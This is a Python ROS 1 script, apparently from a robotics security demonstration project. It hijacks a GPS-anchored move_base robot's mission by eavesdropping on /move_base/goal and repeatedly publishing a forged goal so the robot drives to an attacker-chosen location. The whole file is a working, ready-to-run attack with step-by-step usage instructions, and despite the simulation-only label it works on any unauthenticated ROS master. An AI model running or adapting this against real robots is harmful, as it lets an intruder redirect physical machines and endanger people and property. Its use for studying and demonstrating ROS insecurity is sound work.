#!/usr/bin/env python3
"""Simulation-only mission-HIJACK attack against the GPS-anchored move_base:
overhear the operator's map-frame move_base goal and inject a fake one, so the
robot drives to the ATTACKER's target instead.

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

This targets launch/move_base_gps.launch, whose costmaps live in the "map" frame
and whose operator (operator/operate.py) sends a GPS lat/lon converted to a
map-frame goal. So EVERYTHING the attacker injects is in the "map" frame, and the
attacker can specify its fake target either as a hijacked GPS lat/lon (converted
to map the SAME way the operator does, via /fromLL with a WGS84 geodesy fallback)
or as a direct map-frame point.

WHAT REAL ATTACKERS DO (and this models)
----------------------------------------
ROS 1 authenticates nobody: any peer that reaches the master can SUBSCRIBE to
read the graph and PUBLISH to any topic. Documented real-world ROS attacks are
exactly this -- rogue publish/subscribe on an exposed or pivoted-into master --
NOT on-the-wire packet sniffing or MITM (those are research artifacts). So this
attack:
  1. SUBSCRIBES to /move_base/goal to OVERHEAR the operator's real target
     (a graph read -- NOT a packet sniff; rospy deserializes it for us), then
  2. PUBLISHES a map-frame MoveBaseActionGoal with a fake target (absolute GPS,
     absolute map point, or real+offset), at a steady rate so it stays the newest
     goal move_base acts on.
The robot then drives to the attacker's point. The operator, having sent its own
goal once, never knows.

TIMING: a subscriber only receives goals published AFTER it subscribes, and the
operator's goal is one-shot. So we subscribe FIRST and WAIT (up to --timeout) for
a real goal before injecting. Run this BEFORE the operator sends its mission.

CONTAINER: runs in the attacker's ros-core container (base ros:noetic-ros-core +
move-base-msgs + gazebo-msgs, NO robot_localization). The /fromLL import is
therefore wrapped in try/except ImportError with a WGS84 geodesy fallback, exactly
like operator/operate.py, so GPS-abs mode works without robot_localization.

DETECTABLE: this is a rogue PUBLISH, so `rostopic info /move_base/goal` shows an
extra publisher. That is a true property of what real attackers do; the stealthy
in-flight rewrite (no extra publisher) is on-the-wire MITM -- deliberately NOT
built (academic). See docs/superpowers/specs/2026-08-02-goal-hijack-attack-design.md.

SEE-THEN-DECIDE (two steps):
    # STEP 1 -- watch: overhear the operator's real goal and print it, no attack.
    python3 attack_goal.py --watch
    # ... you read e.g. "operator's real goal is (10.00, 0.00)", decide a target ...
    # STEP 2 -- attack: re-run with your chosen values (operator sends its goal again).
    python3 attack_goal.py --abs-lat 49.9007 --abs-lon 8.9   # hijacked GPS
    python3 attack_goal.py --abs-x 10 --abs-y 12             # direct map point
    python3 attack_goal.py --offset-y 3                      # real + offset
"""
import argparse
import csv
import math
import threading
import time

import rospy
from move_base_msgs.msg import MoveBaseActionGoal
from nav_msgs.msg import Odometry

from goal_marker import place_goal_marker

# GPS -> map fallback datum + WGS84 geodesy (copied verbatim from
# operator/operate.py, which mirrors send_gps_goal.py / drive_to_point_gps.py).
# Datum from gps.urdf.xacro (referenceLatitude 49.9, referenceLongitude 8.9,
# referenceHeading 0). Only used if /fromLL is absent. GOAL_FRAME is "map" to
# match launch/move_base_gps.launch.
GOAL_FRAME = "map"
REF_LAT = 49.9
REF_LON = 8.9
EQUATORIAL_RADIUS = 6378137.0
FLATTENING = 1.0 / 298.257223563
E2 = 2.0 * FLATTENING - FLATTENING ** 2
_SIN2_REF_LAT = math.sin(math.radians(REF_LAT)) ** 2
RADIUS_NORTH = EQUATORIAL_RADIUS * (1.0 - E2) / (1.0 - E2 * _SIN2_REF_LAT) ** 1.5
RADIUS_EAST = (EQUATORIAL_RADIUS / math.sqrt(1.0 - E2 * _SIN2_REF_LAT)
               * math.cos(math.radians(REF_LAT)))
DEG_LAT_PER_METRE = math.degrees(1.0 / RADIUS_NORTH)
DEG_LON_PER_METRE = math.degrees(1.0 / RADIUS_EAST)
FROMLL_WAIT_S = 3.0   # short wait for /fromLL before falling back to geodesy


def fix_to_world_fallback(latitude, longitude):
    """Local WGS84 conversion of a fix to (map_x, map_y). world +x NORTH,
    +y WEST (hence the minus on y). Mirrors operator/operate.py."""
    map_x = (latitude - REF_LAT) / DEG_LAT_PER_METRE
    map_y = -(longitude - REF_LON) / DEG_LON_PER_METRE
    return map_x, map_y


def latlon_to_map(latitude, longitude, altitude=0.0):
    """Convert (lat, lon, alt) -> (map_x, map_y) via the running navsat_transform
    /fromLL service (authoritative -- uses the live datum). Fall back to local
    WGS84 geodesy if /fromLL is not available (e.g. robot_localization absent from
    this container). Returns (map_x, map_y, path)."""
    try:
        from robot_localization.srv import FromLL, FromLLRequest
        from geographic_msgs.msg import GeoPoint
    except ImportError:
        rospy.logwarn("robot_localization/geographic_msgs not available; using "
                      "local WGS84 geodesy fallback (datum %.4f/%.4f).",
                      REF_LAT, REF_LON)
        x, y = fix_to_world_fallback(latitude, longitude)
        return x, y, "geodesy-fallback"

    try:
        rospy.wait_for_service("/fromLL", timeout=FROMLL_WAIT_S)
    except rospy.ROSException:
        rospy.logwarn("/fromLL not available within %.1fs; using local WGS84 "
                      "geodesy fallback (datum %.4f/%.4f).",
                      FROMLL_WAIT_S, REF_LAT, REF_LON)
        x, y = fix_to_world_fallback(latitude, longitude)
        return x, y, "geodesy-fallback"

    try:
        from_ll = rospy.ServiceProxy("/fromLL", FromLL)
        req = FromLLRequest()
        req.ll_point = GeoPoint(latitude=latitude, longitude=longitude,
                                altitude=altitude)
        resp = from_ll(req)
        rospy.loginfo("/fromLL: (lat=%.7f, lon=%.7f, alt=%.2f) -> map=(%.3f, %.3f)",
                      latitude, longitude, altitude,
                      resp.map_point.x, resp.map_point.y)
        return resp.map_point.x, resp.map_point.y, "fromLL"
    except rospy.ServiceException as exc:
        rospy.logwarn("/fromLL call failed (%s); using local WGS84 geodesy "
                      "fallback.", exc)
        x, y = fix_to_world_fallback(latitude, longitude)
        return x, y, "geodesy-fallback"


class GoalHijackAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        self._real_goal = None      # (x, y) overheard from the operator (map frame)
        self._robot_xy = None       # (x, y) from /odometry/filtered_map (map frame)
        self._logged_overheard = False
        self._stop = threading.Event()
        self._start_wall = None

        # Publisher for the injected fake goal.
        self._pub = rospy.Publisher(args.topic, MoveBaseActionGoal, queue_size=1)
        # RECON: subscribe to the SAME topic to overhear the operator's real goal.
        self._goal_sub = rospy.Subscriber(args.topic, MoveBaseActionGoal,
                                          self._on_real_goal, queue_size=1)
        # Robot's actual position (map frame, same frame as the goal), to show
        # the hijack in the CSV.
        rospy.Subscriber("/odometry/filtered_map", Odometry, self._on_odom,
                         queue_size=1)

        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(
            ["elapsed_time", "real_goal_x", "real_goal_y",
             "fake_goal_x", "fake_goal_y", "robot_x", "robot_y"])
        self._csv_file.flush()

    # --- recon / telemetry ---------------------------------------------------
    def _on_real_goal(self, msg):
        """Overhear a goal on the topic. We also receive our OWN injected goals
        here; only the FIRST goal seen is the operator's real one, so we latch it
        once and ignore later messages (which include our injections)."""
        p = msg.goal.target_pose.pose.position
        with self._lock:
            if self._real_goal is None:
                self._real_goal = (p.x, p.y)
                do_log = True
            else:
                do_log = False
        if do_log and not self._logged_overheard:
            self._logged_overheard = True
            rospy.loginfo("OVERHEARD operator goal: (%.2f, %.2f)", p.x, p.y)

    def _on_odom(self, msg):
        with self._lock:
            self._robot_xy = (msg.pose.pose.position.x, msg.pose.pose.position.y)

    # --- the injected message ------------------------------------------------
    def _build_goal(self, fx, fy, real):
        """MoveBaseActionGoal at (fx, fy) in the map frame, facing from the real
        goal toward the fake one. Yaw-only quaternion computed inline (no tf)."""
        yaw = math.atan2(fy - real[1], fx - real[0])
        g = MoveBaseActionGoal()
        g.header.stamp = rospy.Time.now()
        g.goal.target_pose.header.frame_id = GOAL_FRAME
        g.goal.target_pose.header.stamp = rospy.Time.now()
        g.goal.target_pose.pose.position.x = fx
        g.goal.target_pose.pose.position.y = fy
        g.goal.target_pose.pose.orientation.z = math.sin(yaw / 2.0)
        g.goal.target_pose.pose.orientation.w = math.cos(yaw / 2.0)
        return g

    def _log_row(self, real, fake):
        with self._lock:
            robot = self._robot_xy
        elapsed = time.time() - self._start_wall
        rx = robot[0] if robot else float("nan")
        ry = robot[1] if robot else float("nan")
        rospy.loginfo("[t=%6.1fs] real=(%.2f,%.2f) fake=(%.2f,%.2f) "
                      "robot=(%.2f,%.2f)", elapsed, real[0], real[1],
                      fake[0], fake[1], rx, ry)
        self._csv.writerow(
            ["%.3f" % elapsed, "%.4f" % real[0], "%.4f" % real[1],
             "%.4f" % fake[0], "%.4f" % fake[1], "%.4f" % rx, "%.4f" % ry])
        self._csv_file.flush()

    # --- main loop -----------------------------------------------------------
    def run(self):
        # Ensure our subscription is actually CONNECTED to a publisher before we rely
        # on catching the operator's one-shot goal. A fresh ROS subscriber's TCP
        # connection takes a moment to establish; without this, the operator's single
        # un-latched goal can be published into a not-yet-connected subscription and
        # missed. (Verified live: a settled subscription catches the one-shot reliably.)
        connect_deadline = time.time() + 10.0
        while not rospy.is_shutdown() and self._goal_sub.get_num_connections() == 0:
            if time.time() > connect_deadline:
                rospy.logwarn("No publisher on %s yet after 10s; proceeding anyway "
                              "(is move_base up?).", self.args.topic)
                break
            time.sleep(0.1)
        rospy.loginfo("Subscription connected (%d publisher(s)). READY — now waiting "
                      "for the operator's goal.", self._goal_sub.get_num_connections())

        # --watch (Step: listen) and offset mode both NEED to overhear the real
        # goal first, so they wait. Abs mode (Step: send false goal) already has
        # the target, so it does NOT wait -- it injects immediately onto the
        # already-running robot (the real goal was already seen in the --watch step).
        need_real_goal = self.args.watch or self.args.mode == "offset"

        if need_real_goal:
            rospy.loginfo("Lurking: subscribed to %s, waiting up to %.0fs for the "
                          "operator's goal ...", self.args.topic, self.args.timeout)
            deadline = time.time() + self.args.timeout
            while not rospy.is_shutdown():
                with self._lock:
                    real = self._real_goal
                if real is not None:
                    break
                if time.time() > deadline:
                    rospy.logerr("No operator goal seen within %.0fs. Is the "
                                 "operator running?", self.args.timeout)
                    return 1
                time.sleep(0.05)
            if rospy.is_shutdown():
                return 0
        else:
            with self._lock:
                real = self._real_goal
            if real is None:
                real = (0.0, 0.0)  # placeholder for the log/CSV 'real' column

        # WATCH: listen only -- report the real goal and exit, inject NOTHING.
        if self.args.watch:
            rospy.loginfo("WATCH: operator's real map goal is (%.4f, %.4f). "
                          "No injection. Now send the false goal with "
                          "--abs-lat/--abs-lon (GPS), --abs-x/--abs-y (map), or "
                          "--offset-x/--offset-y.", real[0], real[1])
            return 0

        if self.args.mode == "offset":
            fake = (real[0] + self.args.offset_x, real[1] + self.args.offset_y)
            rospy.loginfo("INJECTING fake map goal: real=(%.2f,%.2f) + "
                          "offset=(%.2f,%.2f) -> fake=(%.2f,%.2f)", real[0],
                          real[1], self.args.offset_x, self.args.offset_y,
                          fake[0], fake[1])
        else:
            # abs mode: prefer a hijacked GPS lat/lon (converted to map the SAME
            # way the operator does), else a direct map-frame point.
            if self.args.abs_lat is not None and self.args.abs_lon is not None:
                fx, fy, path = latlon_to_map(self.args.abs_lat, self.args.abs_lon,
                                             self.args.abs_alt)
                fake = (fx, fy)
                rospy.loginfo("INJECTING false GPS goal (lat=%.7f, lon=%.7f) -> "
                              "map=(%.2f,%.2f) via %s", self.args.abs_lat,
                              self.args.abs_lon, fx, fy, path)
            else:
                fake = (self.args.abs_x, self.args.abs_y)
                rospy.loginfo("INJECTING false map goal: (%.2f,%.2f)",
                              fake[0], fake[1])

        # Visual: RED disc FLOATING above the injected fake map goal (best-effort).
        # frame="map" so (fake_x, fake_y) are world coords directly and the disc
        # floats above the lidar height gate (same fix the operator uses).
        place_goal_marker("goal_marker_fake", fake[0], fake[1], "1 0 0",
                          frame="map")

        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0
        while not self._stop.is_set() and not rospy.is_shutdown():
            if self.args.duration > 0 and \
                    (time.time() - self._start_wall) >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break
            self._pub.publish(self._build_goal(fake[0], fake[1], real))
            now = time.time()
            if now >= next_log:
                self._log_row(real, fake)
                next_log += 1.0
            rate.sleep()
        return 0

    def shutdown(self):
        """Idempotent: stop publishing and close the CSV. No corrective goal is
        sent -- we just cease."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Simulation-only mission-hijack against the GPS-anchored "
                    "move_base: overhear the operator's map-frame goal, then "
                    "inject a fake one (hijacked GPS, direct map point, or "
                    "real + offset).")
    p.add_argument("--watch", action="store_true",
                   help="STEP 1 (see-then-decide): overhear the operator's real "
                        "map goal, PRINT it, and exit WITHOUT injecting. Read the "
                        "goal, then re-run without --watch and with target "
                        "values to attack (STEP 2). Injects nothing.")
    p.add_argument("--mode", choices=["offset", "abs"], default=None,
                   help="fake-goal targeting mode. Usually you don't set this: "
                        "giving --abs-lat/--abs-lon or --abs-x/--abs-y selects "
                        "'abs' automatically, otherwise 'offset' is used.")
    p.add_argument("--offset-x", type=float, default=0.0, dest="offset_x",
                   help="x offset (m, map frame) added to the overheard real "
                        "goal (offset mode)")
    p.add_argument("--offset-y", type=float, default=12.0, dest="offset_y",
                   help="y offset (m, map frame) added to the overheard real "
                        "goal (offset mode; default 12)")
    p.add_argument("--abs-lat", type=float, default=None, dest="abs_lat",
                   help="hijacked fake goal LATITUDE (decimal degrees). Giving "
                        "--abs-lat/--abs-lon selects abs mode and converts the "
                        "GPS point to the map frame (like the operator). Takes "
                        "precedence over --abs-x/--abs-y.")
    p.add_argument("--abs-lon", type=float, default=None, dest="abs_lon",
                   help="hijacked fake goal LONGITUDE (decimal degrees; see "
                        "--abs-lat)")
    p.add_argument("--abs-alt", type=float, default=0.0, dest="abs_alt",
                   help="fake goal altitude (m) for /fromLL; default 0.0")
    p.add_argument("--abs-x", type=float, default=None, dest="abs_x",
                   help="absolute fake goal x in the MAP frame. Giving "
                        "--abs-x/--abs-y selects abs mode and injects that exact "
                        "map point (used only if --abs-lat/--abs-lon are absent).")
    p.add_argument("--abs-y", type=float, default=None, dest="abs_y",
                   help="absolute fake goal y in the MAP frame (see --abs-x)")
    p.add_argument("--rate", type=float, default=2.0,
                   help="publish rate in Hz for the injected goal (default 2)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="seconds to keep injecting; 0 = until Ctrl-C (default 0)")
    p.add_argument("--timeout", type=float, default=60.0,
                   help="max seconds to wait for the operator's goal (default 60)")
    p.add_argument("--topic", default="/move_base/goal",
                   help="goal topic to overhear and inject on "
                        "(default /move_base/goal)")
    p.add_argument("--csv", default="attack_goal_report.csv",
                   help="telemetry CSV path (default attack_goal_report.csv)")
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    if args.timeout <= 0:
        p.error("--timeout must be > 0")

    # GPS abs needs BOTH lat and lon; reject a lone one.
    gave_gps = args.abs_lat is not None or args.abs_lon is not None
    if gave_gps and (args.abs_lat is None or args.abs_lon is None):
        p.error("--abs-lat and --abs-lon must be given together")

    # Auto-select mode: giving any abs target (GPS or map point) selects abs;
    # else offset. Precedence within abs is handled at inject time: GPS lat/lon
    # wins over a direct map --abs-x/--abs-y.
    gave_abs = gave_gps or args.abs_x is not None or args.abs_y is not None
    if args.mode is None:
        args.mode = "abs" if gave_abs else "offset"
    # Fill any un-given map abs coord with 0 so the direct-map path always has
    # both (unused when GPS lat/lon are supplied).
    if args.abs_x is None:
        args.abs_x = 0.0
    if args.abs_y is None:
        args.abs_y = 0.0
    return args


def main():
    args = parse_args()
    rospy.init_node("attack_goal", anonymous=True)
    attack = GoalHijackAttack(args)
    rospy.on_shutdown(attack.shutdown)
    try:
        return attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        attack.shutdown()


if __name__ == "__main__":
    import sys
    sys.exit(main() or 0)
